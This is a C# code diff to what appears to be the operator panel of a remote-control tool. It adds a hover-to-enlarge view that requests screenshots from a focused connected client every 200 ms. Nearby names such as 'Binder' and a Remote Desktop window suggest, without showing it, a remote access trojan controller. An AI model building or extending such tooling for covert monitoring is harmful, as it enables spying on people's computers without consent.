@@ -3909,7 +3909,11 @@ Read-Host 'Press Enter to close'
     // ── Screen tab ─────────────────────────────────────────────────────────────
 
     private DispatcherTimer? _screenTimer;
-    private readonly Dictionary<string, System.Windows.Controls.Image> _screenTiles = new();
+    private DispatcherTimer? _screenFastTimer;
+    private string? _focusedScreenId;
+    private System.Threading.CancellationTokenSource? _screenFocusCancelCts;
+    private readonly Dictionary<string, System.Windows.Controls.Image>  _screenTiles   = new();
+    private readonly Dictionary<string, System.Windows.Controls.Border> _screenBorders = new();
     private readonly HashSet<string> _screenHandlers = new();
 
     // ── Binder ──────────────────────────────────────────────────────────
@@ -3931,11 +3935,63 @@ Read-Host 'Press Enter to close'
     private void ScreenStop_Click(object sender, RoutedEventArgs e)
     {
         _screenTimer?.Stop(); _screenTimer = null;
+        ClearScreenFocus();
         BtnScreenStart.IsEnabled = true;  BtnScreenStart.Opacity = 1.0;
         BtnScreenStop.IsEnabled  = false; BtnScreenStop.Opacity  = 0.35;
         foreach (var id in _screenHandlers.ToList())
             _server?.UnregisterHandler(id, PacketType.ScreenshotResult);
         _screenHandlers.Clear();
+    }
+
+    private void SetScreenFocus(string clientId)
+    {
+        // Restore border of previously focused tile
+        if (_focusedScreenId != null && _screenBorders.TryGetValue(_focusedScreenId, out var prev))
+            prev.BorderBrush = new SolidColorBrush(Color.FromRgb(0x1A, 0x1E, 0x36));
+
+        _focusedScreenId = clientId;
+        ScreenBigPanel.Visibility = Visibility.Visible;
+        ScreenBigLabel.Text = clientId;
+
+        // Highlight focused tile
+        if (_screenBorders.TryGetValue(clientId, out var cur))
+            cur.BorderBrush = new SolidColorBrush(Color.FromRgb(0x5A, 0x45, 0xE5));
+
+        // Show current tile frame immediately in the big panel
+        if (_screenTiles.TryGetValue(clientId, out var img))
+            ScreenBigImage.Source = img.Source;
+
+        // Fast timer — requests only the focused client
+        _screenFastTimer?.Stop();
+        _screenFastTimer = new DispatcherTimer { Interval = TimeSpan.FromMilliseconds(200) };
+        _screenFastTimer.Tick += (_, _) => RequestFocusedScreenshot();
+        _screenFastTimer.Start();
+        RequestFocusedScreenshot();
+    }
+
+    private void ClearScreenFocus()
+    {
+        if (_focusedScreenId != null && _screenBorders.TryGetValue(_focusedScreenId, out var border))
+            border.BorderBrush = new SolidColorBrush(Color.FromRgb(0x1A, 0x1E, 0x36));
+
+        _focusedScreenId = null;
+        _screenFastTimer?.Stop();
+        _screenFastTimer = null;
+        ScreenBigPanel.Visibility = Visibility.Collapsed;
+        ScreenBigImage.Source = null;
+    }
+
+    private void BtnScreenBigClose_Click(object sender, RoutedEventArgs e) => ClearScreenFocus();
+
+    private void RequestFocusedScreenshot()
+    {
+        if (_server == null || _focusedScreenId == null) return;
+        if (!_server.ConnectedClients.ContainsKey(_focusedScreenId))
+        {
+            Dispatcher.BeginInvoke(ClearScreenFocus);
+            return;
+        }
+        _ = _server.SendToClient(_focusedScreenId, new Packet { Type = PacketType.Screenshot });
     }
 
     private void RequestScreenshots()
@@ -3947,12 +4003,14 @@ Read-Host 'Press Enter to close'
         var ids = clients.Select(c => c.Id).ToHashSet();
         foreach (var key in _screenTiles.Keys.Where(k => !ids.Contains(k)).ToList())
         {
+            if (key == _focusedScreenId) ClearScreenFocus();
             if (_screenTiles[key].Parent is System.Windows.FrameworkElement fe)
             {
                 var panel = VisualTreeHelperGetParent(fe);
                 if (panel is System.Windows.Controls.Primitives.UniformGrid ug) ug.Children.Remove(fe);
             }
             _screenTiles.Remove(key);
+            _screenBorders.Remove(key);
         }
 
         foreach (var client in clients)
@@ -4052,8 +4110,25 @@ Read-Host 'Press Enter to close'
                 new DoubleAnimation(st.ScaleY, 1.04, TimeSpan.FromMilliseconds(100)));
         };
 
-        // Double-click → open Remote Desktop window for this client
+        // Hover → show big panel for this tile at fast refresh rate
+        // MouseLeave uses a short delay so moving between tiles doesn't flicker the panel closed
         var capturedId = client.Id;
+        border.MouseEnter += (_, _) =>
+        {
+            _screenFocusCancelCts?.Cancel();
+            _screenFocusCancelCts = null;
+            SetScreenFocus(capturedId);
+        };
+        border.MouseLeave += (_, _) =>
+        {
+            _screenFocusCancelCts?.Cancel();
+            var cts = new System.Threading.CancellationTokenSource();
+            _screenFocusCancelCts = cts;
+            System.Threading.Tasks.Task.Delay(350, cts.Token).ContinueWith(t =>
+            {
+                if (!t.IsCanceled) Dispatcher.BeginInvoke(ClearScreenFocus);
+            }, System.Threading.Tasks.TaskScheduler.Default);
+        };
         border.MouseLeftButtonDown += (_, e) =>
         {
             if (e.ClickCount != 2) return;
@@ -4064,7 +4139,8 @@ Read-Host 'Press Enter to close'
         };
 
         ScreenPanel.Children.Add(border);
-        _screenTiles[client.Id] = img;
+        _screenTiles[client.Id]   = img;
+        _screenBorders[client.Id] = border;
     }
 
     private void ScreenScroll_SizeChanged(object sender, SizeChangedEventArgs e)
@@ -4092,7 +4168,6 @@ Read-Host 'Press Enter to close'
             if (result == null || string.IsNullOrEmpty(result.Data)) return;
             Dispatcher.BeginInvoke(() =>
             {
-                if (!_screenTiles.TryGetValue(clientId, out var img)) return;
                 try
                 {
                     var bytes = Convert.FromBase64String(result.Data);
@@ -4103,7 +4178,10 @@ Read-Host 'Press Enter to close'
                     bmp.StreamSource = ms;
                     bmp.EndInit();
                     bmp.Freeze();
-                    img.Source = bmp;
+                    if (clientId == _focusedScreenId)
+                        ScreenBigImage.Source = bmp;
+                    if (_screenTiles.TryGetValue(clientId, out var img))
+                        img.Source = bmp;
                 }
                 catch { }
             });
